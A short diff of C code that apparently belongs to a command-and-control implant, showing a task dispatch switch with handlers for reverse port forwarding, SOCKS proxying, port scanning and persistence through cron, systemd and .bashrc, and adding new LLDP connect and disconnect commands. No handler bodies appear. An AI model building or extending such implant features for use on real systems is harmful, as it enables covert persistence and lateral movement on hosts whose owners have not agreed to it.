@@ -680,8 +680,10 @@ void dispatch_task(uint8_t cmd_id, const char *task_uuid,
         case CMD_RPFWD:      cmd_rpfwd_handler(task_uuid, &params); break;
         case CMD_SOCKS:      cmd_socks_handler(task_uuid, &params); break;
         case CMD_PORTSCAN:   cmd_portscan_handler(task_uuid, &params); break;
-        case CMD_CONNECT:    cmd_connect_handler(task_uuid, &params); break;
-        case CMD_DISCONNECT: cmd_disconnect_handler(task_uuid, &params); break;
+        case CMD_CONNECT:         cmd_connect_handler(task_uuid, &params); break;
+        case CMD_DISCONNECT:      cmd_disconnect_handler(task_uuid, &params); break;
+        case CMD_LLDP_CONNECT:    cmd_lldp_connect_handler(task_uuid, &params); break;
+        case CMD_LLDP_DISCONNECT: cmd_lldp_disconnect_handler(task_uuid, &params); break;
         case CMD_PERSIST_CRON:    cmd_persist_cron(task_uuid, &params); break;
         case CMD_PERSIST_SYSTEMD: cmd_persist_systemd(task_uuid, &params); break;
         case CMD_PERSIST_BASHRC:  cmd_persist_bashrc(task_uuid, &params); break;
